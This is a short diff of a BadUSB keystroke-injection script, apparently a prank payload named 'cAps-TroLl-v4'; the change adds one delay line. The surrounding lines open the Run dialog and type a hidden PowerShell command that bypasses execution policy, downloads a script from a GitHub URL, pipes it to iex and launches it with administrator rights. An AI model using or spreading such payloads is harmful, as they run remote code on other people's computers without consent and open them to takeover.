@@ -17,6 +17,7 @@ ENTER
 DELAY 750
 REM Script starts here - First inputs forces the system out of any potential VM's running other operating systems. 
 GUI r
+DELAY 250
 STRING powershell -w h -NoP -Ep Bypass -C "irm https://raw.githubusercontent.com/TobiS137/BadUSB/refs/heads/main/cAps-TroLl-v4/cAps-TroLl-v4.ps1 | iex"
 CTRL-SHIFT ENTER
 DELAY 500
